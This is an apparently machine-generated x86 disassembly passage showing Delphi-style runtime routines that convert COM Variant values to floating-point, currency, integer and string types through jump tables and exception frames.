mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411824
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411879
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f500
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4118d4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411880
lea eax [ ebp - 0x18 ]
call sub_40f1d8
retn
sub_411888
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4118d4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4118f0 ]
mov eax ebx
call sub_41168c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117d8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41168c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4118d4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117d8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411824
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e9a0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411888
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4117d8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117d8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411abb ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117d8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41168c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4118d4
fstp [ esp ]
fwait
jmp r-xdata
sub_411c24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c18
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_40991c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411cd7
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404744
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ee34
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ee34
jmp r-xdata
sub_411ce0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee34
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411d40
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee34
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411d8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411de1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f500
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411e3c
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411de8
lea eax [ ebp - 0x18 ]
call sub_40f1d8
retn
sub_411df0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411e3c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411e58 ]
mov eax ebx
call sub_411c24
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c24
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411e3c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411d8c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e9a0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411df0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41205d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411d40
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c24
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411e3c
fistp [ esp ]
fwait
jmp r-xdata
sub_412208
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404744
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ee34
pop ebx
pop ebp
retn 0x8
sub_412240
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404744
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ee34
pop ebx
pop ebp
retn 0x8
sub_412278
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41232e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404744
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ee34
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412335
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4042c0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407f68
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404890
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407f2c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404890
jmp r-xdata
jmp r-xdata
call sub_40ea3c
sub_41233c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4123fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4123d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ee34
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404854
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404940
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4123e0
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
sub_412408
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41245e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f500
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4124f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412465
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
sub_41246c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4146ec
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4124e1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f1d8
retn
sub_4124f0
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412a27
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412529 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40408c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404038
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40408c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409848
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40408c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409848
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40408c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412208
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042c0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412240
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404854
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404940
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_412278
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_40827c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408368
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40408c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408368
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4124f0
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41233c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40408c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a2e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40405c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40475c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40405c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40475c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412408
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40408c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40408c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e9a0
test ah 0x40
je r-xdata
mov eax esi
call sub_404038
mov edx eax
mov eax ebx
call sub_41246c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_41233c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40408c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_41233c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40408c
jmp r-xdata
jmp [ eax * 4 + jump_table_4127bd ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409848
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409848
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412208
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4042c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412240
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4042c0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404260
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412278
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40827c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408368
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408368
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4124f0
jmp r-xdata
sub_412a34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412ade
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ac1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ee34
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404854
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ac8
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
sub_412aec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b42
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f500
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412c18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b49
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
sub_412b50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412c08
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4146ec
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c0f
lea eax [ ebp - 0x20 ]
call sub_404744
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412beb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404854
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f1d8
retn
sub_412c18
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41316a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412c52 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404890
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404744
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40827c
